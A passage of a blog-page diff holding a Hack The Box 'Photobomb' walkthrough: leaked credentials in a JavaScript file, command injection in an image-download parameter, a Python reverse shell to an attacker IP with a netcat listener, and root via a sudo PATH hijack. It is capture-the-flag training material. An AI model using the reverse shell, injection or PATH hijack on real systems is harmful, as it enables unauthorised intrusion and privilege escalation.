+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DirBuster 1.0-RC1 - Report
+</span></span><span class="line"><span class="cl">http://photobomb.htb:80
+</span></span><span class="line"><span class="cl">--------------------------------
+</span></span><span class="line"><span class="cl">Directories found during testing:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dirs found with a <span class="m">200</span> response:
+</span></span><span class="line"><span class="cl">/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Files found with a <span class="m">200</span> responce:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/photobomb.js
+</span></span><span class="line"><span class="cl">--------------------------------
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, We have found a Javascript file called <strong>photobomb.js</strong>, Let&rsquo;s see what is in it.</p>
+<p><img src="/post/Photobomb_HTB/imgs/4.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="photobomb.js"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s1">&#39;creds&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span><span class="s1">&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, we credientals to signup to the <strong>/printer</strong> page.</p>
+<p>Copy and paste the URL given above which is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://pH0t0:b0Mb!@photobomb.htb/printer
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It opens a page contans a plenty of images and down there is a button to download any image we want.</p>
+<p><img src="/post/Photobomb_HTB/imgs/5.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="images"
+	
+	
+></p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let&rsquo;s start burpsuite and intercept the downloading request.</p>
+<p><img src="/post/Photobomb_HTB/imgs/6.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="req1"
+	
+	
+></p>
+<p>So, I have tried to command inject all the parameters with adding <strong>;ls</strong> at the end of each parameter and see what happens.</p>
+<p>Beginning with <strong>photo</strong> parameter:</p>
+<p><img src="/post/Photobomb_HTB/imgs/7.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="req2"
+	
+	
+></p>
+<p>looks not injectable, Then trying on <strong>dimensions</strong> parameter:</p>
+<p><img src="/post/Photobomb_HTB/imgs/8.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="req3"
+	
+	
+></p>
+<p>Also, Not injectable.</p>
+<p>Lastly, The <strong>filetype</strong> parameter:</p>
+<p><img src="/post/Photobomb_HTB/imgs/9.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="req4"
+	
+	
+></p>
+<p>It shows no response, so, It is <em>injectable</em>.</p>
+<p>Let&rsquo;s prepare the <strong>reverse shell</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.23&#34;,4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And setup the <strong>listener</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nlvp <span class="m">4321</span>       
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4321</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/Photobomb_HTB/imgs/10.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="req5"
+	
+	
+></p>
+<p>And we got the <strong>reverse shell</strong>. Yay!</p>
+<p><img src="/post/Photobomb_HTB/imgs/11.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="revshell"
+	
+	
+></p>
+<p>Let&rsquo;s respawn a <strong>tty</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ /usr/bin/script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">wizard@photobomb:~/photobomb$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span>
+</span></span><span class="line"><span class="cl">wizard@photobomb:~/photobomb$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have the access of the user called <strong>wizard</strong>.</p>
+<p>Now, We navigate to the home directory and get the <strong>user.txt</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~/photobomb$ <span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">wizard@photobomb:/home$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">wizard
+</span></span><span class="line"><span class="cl">wizard@photobomb:/home$ <span class="nb">cd</span> wizard
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> wizard
+</span></span><span class="line"><span class="cl">wizard@photobomb:~$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">photobomb  user.txt
+</span></span><span class="line"><span class="cl">wizard@photobomb:~$ cat user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">41ca28b0feb7e65553b07391beec7031
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilage-escalation">Privilage Escalation</h2>
+<h3 id="sudo--l">Sudo -l</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~/photobomb$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> wizard on photobomb:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User wizard may run the following commands on photobomb:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It looks like in order to have the <strong>root</strong> privilage, We only have that script:</p>
+<blockquote>
+<p>/opt/cleanup.sh</p>
+</blockquote>
+<p>That we can run with the <strong>root</strong> privilage.</p>
+<p>if we have tried to run that script, We get:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:/opt$ ./cleanup.sh
+</span></span><span class="line"><span class="cl">./cleanup.sh
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/voicu-apostol-MWER49YaD-M-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/calvin-craig-T3M72YMf2oc-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/x.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/--reference=x.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&#39;</span>: Operation not permitted
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s see what that script do:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:/opt$ cat cleanup.sh
+</span></span><span class="line"><span class="cl">cat cleanup.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">. /opt/.bashrc
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/wizard/photobomb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># clean up log files</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -s log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> ! <span class="o">[</span> -L log/photobomb.log <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+</span></span><span class="line"><span class="cl">  /usr/bin/truncate -s0 log/photobomb.log
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># protect the priceless originals</span>
+</span></span><span class="line"><span class="cl">find source_images -type f -name <span class="s1">&#39;*.jpg&#39;</span> -exec chown root:root <span class="o">{}</span> <span class="se">\;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The script is copying the content of the <strong>photobomb.log</strong> and put in inside <strong>photobomb.log.old</strong>.</p>
+<p>and then truncate the content from it.</p>
+<p>So, We will add <code>/bin/bash</code> in cd file and give read, write, execute permission.</p>
+<p>And then we run the file with <code>sudo</code> and set the <code>PATH</code> to <code>/tmp</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:/$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/cd
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/cd
+</span></span><span class="line"><span class="cl">wizard@photobomb:/$ chmod <span class="m">777</span> /tmp/cd
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp/cd
+</span></span><span class="line"><span class="cl">wizard@photobomb:/$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/find
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/find
+</span></span><span class="line"><span class="cl">wizard@photobomb:/$ chmod <span class="m">777</span> /tmp/find
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp/find
+</span></span><span class="line"><span class="cl">wizard@photobomb:/$ sudo <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
+</span></span><span class="line"><span class="cl">sudo <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
+</span></span><span class="line"><span class="cl">root@photobomb:/home/wizard/photobomb# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@photobomb:/home/wizard/photobomb# <span class="nb">cd</span> /root
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root
+</span></span><span class="line"><span class="cl">root@photobomb:~# ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">root@photobomb:~# cat root.txt
+</span></span><span class="line"><span class="cl">cat root.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="pwned">Pwned</h4>
+<p><img src="/post/Photobomb_HTB/imgs/rooted.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="rooted"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pentesting/">PenTesting</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/exploit/">Exploit</a>
+        
+            <a href="/tags/vulnerability/">Vulnerability</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/mission-challenges-walkthrough-rcts-cert-ctf-2021/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Mission_RCTS/missionCTF.jpg" loading="lazy" data-key="" data-hash="/post/Mission_RCTS/missionCTF.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mission Challenges Walkthrough - RCTS CERT CTF 2021</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Abdallah Adham
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.12.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
+        <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+        <li><a href="#directory-bruteforce">Directory Bruteforce</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilage-escalation">Privilage Escalation</a>
+      <ol>
+        <li><a href="#sudo--l">Sudo -l</a>
+          <ol>
+            <li><a href="#pwned">Pwned</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
